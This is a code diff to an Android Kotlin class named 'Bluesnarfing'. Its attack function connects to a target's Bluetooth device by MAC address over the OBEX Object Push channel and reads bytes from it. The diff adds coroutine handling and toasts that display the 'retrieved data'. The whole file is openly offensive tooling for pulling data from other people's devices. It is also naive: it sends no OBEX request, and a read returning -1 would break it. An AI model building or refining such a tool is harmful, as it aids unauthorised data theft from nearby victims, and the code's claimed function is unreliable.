@@ -9,19 +9,23 @@ import androidx.core.app.ActivityCompat
 import java.io.IOException
 import java.util.*
 
+import android.widget.Toast
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.withContext
+
 class Bluesnarfing(
     private val context: Context,
     private val bluetoothAdapter: BluetoothAdapter?
 ) {
-    fun attack(macAddress: String) {
+    suspend fun attack(macAddress: String) {
         if (bluetoothAdapter == null) {
-            // Handle Bluetooth not supported
+            // TODO: Propagate error to UI: Bluetooth not supported
             return
         }
 
         val device: BluetoothDevice? = bluetoothAdapter.getRemoteDevice(macAddress)
         if (device == null) {
-            // Handle device not found
+            // TODO: Propagate error to UI: Device not found
             return
         }
 
@@ -30,21 +34,29 @@ class Bluesnarfing(
                 Manifest.permission.BLUETOOTH_CONNECT
             ) != PackageManager.PERMISSION_GRANTED
         ) {
-            // Handle missing permission
+            // TODO: Propagate error to UI: Missing permission
             return
         }
 
-        val uuid = UUID.fromString("00001105-0000-1000-8000-00805f9b34fb")
-        try {
-            val socket = device.createRfcommSocketToServiceRecord(uuid)
-            socket.connect()
-            val inputStream = socket.inputStream
-            val buffer = ByteArray(1024)
-            val bytes = inputStream.read(buffer)
-            // TODO: Process the retrieved data
-            socket.close()
-        } catch (e: IOException) {
-            e.printStackTrace()
+        withContext(Dispatchers.IO) {
+            try {
+                val uuid = UUID.fromString("00001105-0000-1000-8000-00805f9b34fb")
+                device.createRfcommSocketToServiceRecord(uuid).use { socket ->
+                    socket.connect()
+                    val inputStream = socket.inputStream
+                    val buffer = ByteArray(1024)
+                    val bytes = inputStream.read(buffer)
+                    val data = String(buffer, 0, bytes)
+                    withContext(Dispatchers.Main) {
+                        Toast.makeText(context, "Retrieved data: $data", Toast.LENGTH_LONG).show()
+                    }
+                }
+            } catch (e: IOException) {
+                withContext(Dispatchers.Main) {
+                    Toast.makeText(context, "Error: ${e.message}", Toast.LENGTH_LONG).show()
+                }
+                e.printStackTrace()
+            }
         }
     }
 }
